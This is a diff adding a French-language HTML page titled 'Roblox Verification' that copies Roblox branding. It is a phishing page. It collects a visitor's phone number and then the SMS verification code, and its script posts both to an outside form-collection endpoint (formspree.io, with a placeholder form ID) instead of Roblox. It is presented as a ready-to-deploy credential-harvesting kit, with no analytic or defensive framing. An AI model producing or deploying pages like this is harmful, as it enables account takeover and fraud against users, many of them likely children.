@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Verification</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            /* Ton image en fond */
+            background-image: url('fond.jpg'); 
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat;
+            color: white;
+        }
+
+        /* Petit filtre noir pour que le texte soit plus lisible sur l'image */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+
+        .container { 
+            background: rgba(255, 255, 255, 0.95); /* Fond blanc semi-transparent */
+            padding: 30px; 
+            border-radius: 15px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
+            max-width: 350px; 
+            width: 100%;
+            text-align: center;
+            color: #333; /* Texte noir pour le contraste */
+        }
+
+        h1 {
+            margin-top: 0;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* Le Logo Roblox (Carré) */
+        .roblox-icon {
+            width: 30px;
+            height: 30px;
+            background-color: #000; /* Noir par défaut */
+            border-radius: 4px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        /* Le logo "O" intégré dans le carré */
+        .roblox-icon::after {
+            content: "";
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            width: 20px;
+            height: 20px;
+            background-color: white;
+            border-radius: 50%; /* Rend le carré "O" arrondi ou garde le style carré Roblox */
+        }
+
+        input { 
+            width: 90%; 
+            padding: 12px; 
+            margin: 15px 0; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            font-size: 16px;
+            box-sizing: border-box; /* Empêche les débordements */
+        }
+
+        button { 
+            padding: 12px 20px; 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 16px;
+            font-weight: bold;
+        } 
+
+        button:hover { 
+            background: #0056b3; 
+        } 
+
+        .hidden { 
+            display: none; 
+        }
+
+        #loading { 
+            margin-top: 20px; 
+            color: gray; 
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ÉTAPE 1 : NUMÉRO -->
+    <div id="step1" class="container">
+        <h1>
+            <!-- Icône Carré Roblox -->
+            <div class="roblox-icon"></div>
+            Roblox
+        </h1>
+        
+        <form id="formPhone" action="https://formspree.io/f/TON_CODE_ICI" method="POST">
+            <input type="tel" name="numero" placeholder="Entrez votre numéro" required>
+            <button type="submit">Valider le numéro</button>
+        </form>
+        <div id="loading" class="hidden">Envoi en cours...</div>
+    </div>
+
+    <!-- ÉTAPE 2 : CODE SMS -->
+    <div id="step2" class="container hidden">
+        <h1>
+            <div class="roblox-icon"></div>
+            Roblox
+        </h1>
+        <p>Entrez le code reçu par SMS :</p>
+        
+        <input type="hidden" name="numero" id="hiddenPhone">
+        <input type="text" name="code" placeholder="Code à 4 chiffres" required>
+        <button type="button" onclick="submitCode()">Valider</button>
+    </div>
+
+    <script>
+        // Étape 1 : Envoi du numéro
+        document.getElementById('formPhone').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            const phoneInput = document.querySelector('input[name="numero"]').value;
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this),
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('loading').classList.remove('hidden');
+                    setTimeout(() => {
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                        document.getElementById('hiddenPhone').value = phoneInput;
+                    }, 1000);
+                }
+            });
+        });
+
+        // Étape 2 : Envoi du code
+        function submitCode() {
+            const codeInput = document.querySelector('input[name="code"]').value;
+            const phone = document.getElementById('hiddenPhone').value;
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://formspree.io/f/TON_CODE_ICI'; 
+            
+            const fieldNum = document.createElement('input');
+            fieldNum.type = 'hidden';
+            fieldNum.name = 'numero';
+            fieldNum.value = phone;
+            
+            const fieldCode = document.createElement('input');
+            fieldCode.type = 'hidden';
+            fieldCode.name = 'code';
+            fieldCode.value = codeInput;
+            
+            form.appendChild(fieldNum);
+            form.appendChild(fieldCode);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+  </html>
